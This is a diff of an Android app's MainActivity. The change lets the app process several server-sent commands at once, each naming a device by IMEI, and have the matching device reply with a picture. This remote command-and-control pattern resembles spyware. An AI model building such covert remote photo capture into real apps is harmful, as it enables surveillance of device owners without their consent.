@@ -29,6 +29,7 @@ import org.apache.http.protocol.HTTP;
 import org.apache.http.protocol.HttpContext;
 import org.apache.http.util.EntityUtils;
 
+import android.R.integer;
 import android.app.Activity;  
 import android.content.ContentResolver;
 import android.content.Context;
@@ -78,32 +79,39 @@ public class MainActivity extends Activity {
                 String command = getCommand();                
                 try{
 	    			if(!command.equals("noCommand")){
-	    				String[] temp = command.split(":");
-	    				String command_id = temp[0];
-	    				String command_type = temp[1];
-	    				String target = temp[2];
-	    				
-	    				String[] deviceInfo = getDeviceInfo();
-	    				String IMEI = deviceInfo[0];
-	    				
-	    				if(IMEI.equals(target)){	    				
-		    				String data = "";		    				
-		    				switch(Integer.parseInt(command_type)){
-		    					case 1:data = replyPicture(command_id);break;
-		    					default:data = "invalidCommand";break;
-		    				}
+	    				boolean flag = false;
+	    				String[] commands = command.split("%");
+	    				for (int i=0;i < commands.length;i++){
+		    				String[] temp = commands[i].split(":");
+		    				String command_id = temp[0];
+		    				String command_type = temp[1];
+		    				String target = temp[2];
 		    				
-		    				if(data != "invalidCommand"){
-		    					result = data;
+		    				String[] deviceInfo = getDeviceInfo();
+		    				String IMEI = deviceInfo[0];
+		    				
+		    				if(IMEI.equals(target)){	    				
+			    				String data = "";		    				
+			    				switch(Integer.parseInt(command_type)){
+			    					case 1:data = replyPicture(command_id);break;
+			    					default:data = "invalidCommand";break;
+			    				}
+			    				
+			    				if(data != "invalidCommand"){
+			    					//result = data;
+			    					flag = flag | true;
+			    				}
+			    				else{
+			    					//result = "invalidCommand";
+			    					flag = flag | false;
+			    				}
 		    				}
 		    				else{
-		    					result = "invalidCommand";
+		    					//result = "noCommand";
+		    					flag = flag | false;
 		    				}
 	    				}
-	    				else{
-	    					result = "noCommand";
-	    				}
-	    				
+	    				result = (flag) ? "getCommand" : "noCommand or invalidCommand";
 	    			}
 	    			else{
 	    				result = "noCommand";    				
